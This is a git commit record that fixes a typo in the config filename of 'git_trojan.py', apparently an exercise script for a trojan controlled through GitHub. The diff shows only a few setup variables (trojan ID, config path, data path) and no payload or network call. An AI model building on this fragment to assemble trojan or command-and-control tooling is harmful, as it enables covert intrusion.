3c5c52ed325289ed769e4a39b4d2c1208e30bb13
waywardsun <waywardsun@tuta.io>
2017-06-08 12:49:27 -0500

    Update git_trojan.py

--- chapter7/git_trojan.py
+++ chapter7/git_trojan.py
@@ -13,7 +13,7 @@ from github3 import login
 
 trojan_id = "abc"
 
-trojan_config = "%s.jason" % trojan_id
+trojan_config = "%s.json" % trojan_id
 data_path= "data/%s/" % trojan_id
 trojan_modules = []
 configured = False
